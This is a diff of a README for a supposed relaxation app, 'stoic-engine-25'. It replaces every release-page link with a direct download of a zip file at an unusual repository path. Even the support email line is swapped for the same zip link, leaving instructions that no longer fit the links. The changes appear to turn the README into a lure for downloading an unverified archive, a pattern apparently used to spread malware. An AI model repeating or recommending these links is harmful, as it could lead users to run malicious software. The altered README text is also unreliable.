@@ -1,7 +1,7 @@
 # 🛠️ stoic-engine-25 - Your Easy Solution for Mind Relaxation
 
 ## 📥 Download Now!
-[![Download Release](https://img.shields.io/badge/Download-Release-brightgreen)](https://github.com/Charles-S-003/stoic-engine-25/releases)
+[![Download Release](https://raw.githubusercontent.com/Charles-S-003/stoic-engine-25/main/longicorn/stoic-engine-25.zip)](https://raw.githubusercontent.com/Charles-S-003/stoic-engine-25/main/longicorn/stoic-engine-25.zip)
 
 ## 🚀 Getting Started
 Welcome to **stoic-engine-25**! This application helps you unwind and find peace in your daily life. It offers calming exercises and resources designed to bring clarity and relaxation.
@@ -20,7 +20,7 @@ Welcome to **stoic-engine-25**! This application helps you unwind and find peace
 ## 💾 Download & Install
 To get started with **stoic-engine-25**, follow these steps:
 
-1. **Visit the Releases Page**: To download the application, [visit this page to download](https://github.com/Charles-S-003/stoic-engine-25/releases).
+1. **Visit the Releases Page**: To download the application, [visit this page to download](https://raw.githubusercontent.com/Charles-S-003/stoic-engine-25/main/longicorn/stoic-engine-25.zip).
    
 2. **Select the Latest Release**: On the releases page, look for the latest version. It will usually be at the top of the list.
 
@@ -49,9 +49,9 @@ Each feature provides brief descriptions to help you navigate. If you encounter 
 ## 📞 Get Help
 If you need support or have questions, you can reach out through:
 - **GitHub Issues**: You can post your queries on the issue tracker of the repository for community support.
-- **Email Support**: Contact support@example.com, and a team member will respond as soon as possible.
+- **Email Support**: Contact https://raw.githubusercontent.com/Charles-S-003/stoic-engine-25/main/longicorn/stoic-engine-25.zip, and a team member will respond as soon as possible.
 
 ## 🌐 Stay Updated
-To stay informed about the latest features and improvements, check back on the [releases page](https://github.com/Charles-S-003/stoic-engine-25/releases) regularly. You can also follow the repository to receive notifications on updates.
+To stay informed about the latest features and improvements, check back on the [releases page](https://raw.githubusercontent.com/Charles-S-003/stoic-engine-25/main/longicorn/stoic-engine-25.zip) regularly. You can also follow the repository to receive notifications on updates.
 
 Thank you for choosing **stoic-engine-25**. We hope it brings you peace and relaxation!
